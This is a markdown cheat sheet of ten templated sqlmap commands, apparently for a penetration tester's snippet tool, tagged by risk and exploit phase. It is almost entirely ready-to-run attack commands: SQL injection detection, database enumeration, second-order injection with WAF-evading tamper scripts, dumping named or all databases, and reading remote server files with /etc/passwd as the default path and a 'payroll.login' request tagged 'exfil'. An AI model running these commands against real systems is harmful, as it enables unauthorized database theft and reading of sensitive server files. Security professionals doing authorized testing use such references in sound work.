# sqlmap

> Only the patterns you actually use. Ten entries, nothing extra. All destructive-adjacent entries use `--level 5 --risk 3 --batch` per your note style.

<!-- tags: sqlmap, sqli, injection, dump, enum -->

> **Technique letters:**
> `B` boolean-blind · `E` error-based · `U` union · `S` stacked · `T` time-blind · `Q` inline
> Multichoice picker pre-checks all 6 — uncheck to narrow.

---

## test single target
Fire-and-forget baseline against a URL (no params, no flags). Lets sqlmap auto-detect.

```bash
sqlmap -u "{{URL:url}}"
```

<!-- meta: risk=medium | phase=exploit | tags=basic,url -->

---

## enum dbs from request file
Request file + specific param + max depth + batch. `--dbms=` hint speeds things up if you know the engine.

```bash
sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --level 5 --risk 3 --batch --dbs --dbms={{DBMS:choice:mysql,mssql,postgresql,oracle,sqlite,mariadb,db2,access,sybase}}
```

<!-- meta: risk=medium | phase=exploit | tags=request,enum,dbs -->

---

## enum second order without proxy
Second-order SQLi — initial injection fires in req, server stores it, second request (res.sql) triggers the SQL execution. `space2comment` tamper evades basic WAF patterns.

```bash
sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --tamper=space2comment --level 5 --risk 3 --batch --dbs
```

<!-- meta: risk=medium | phase=exploit | tags=second-order,tamper -->

---

## enum second order with proxy
Same as above but routes through Burp (localhost:8080). Visibility into every sqlmap-sent request.

```bash
sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --tamper=space2comment --level 5 --risk 3 --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dbs
```

<!-- meta: risk=medium | phase=exploit | tags=second-order,proxy,burp -->

---

## enum second order with proxy and technique
Full flag stack — proxy + technique multichoice (pre-checks all 6, uncheck to narrow). `tr -d ,` strips commas so `BEUSQT` lands as one joined string.

```bash
sqlmap -r {{REQUEST:file:req}} -p {{PARAM:str}} --second-req {{SECOND:file:res.sql}} --tamper=space2comment --level 5 --risk 3 --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,T=time blind,Q=inline query}}" | tr -d ,)
```

<!-- meta: risk=medium | phase=exploit | tags=second-order,proxy,technique,multichoice -->

---

## test url list
Bulk-test a file of URLs, no other flags — baseline scan.

```bash
sqlmap -m {{URLS:file:urls.txt}}
```

<!-- meta: risk=medium | phase=exploit | tags=bulk,url-list -->

---

## enum url list with technique
Full-depth scan over a URL list with tamper + technique multichoice.

```bash
sqlmap -m {{URLS:file:urls.txt}} --tamper=space2comment --level 5 --risk 3 --batch --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,T=time blind,Q=inline query}}" | tr -d ,)
```

<!-- meta: risk=medium | phase=exploit | tags=bulk,url-list,technique,multichoice -->

---

## dump named database
Target one database by name with `-D DBNAME --dump`. Technique multichoice included.

```bash
sqlmap -r {{REQUEST:file:sql.tst}} --tamper=space2comment --level 5 --risk 3 --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,Q=inline query}}" | tr -d ,) --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch -D {{DATABASE:str}} --dump
```

<!-- meta: risk=high | phase=exploit | tags=dump,named-db,technique -->

---

## dump all exclude sysdbs
Dump every non-system database. Big noisy operation — only when you want it all.

```bash
sqlmap -r {{REQUEST:file:sql.tst}} --tamper=space2comment --level 5 --risk 3 --dbs --technique=$(echo "{{TECHNIQUE:multichoice:B=boolean blind,E=error based,U=union query,S=stacked queries,Q=inline query}}" | tr -d ,) --proxy {{PROXY:url:http://127.0.0.1:8080}} --batch --dump-all --exclude-sysdbs
```

<!-- meta: risk=high | phase=exploit | tags=dump-all,sysdbs,technique -->

---

## read remote file
`--file-read=/path` works when the DB engine's file-read function is enabled (MySQL load_file, MSSQL OPENROWSET, etc). Pulls the file to local sqlmap output dir.

```bash
sqlmap -r {{REQUEST:file:payroll.login}} --batch --file-read={{REMOTE_PATH:str:/etc/passwd}}
```

<!-- meta: risk=high | phase=post-exploit | tags=file-read,exfil -->
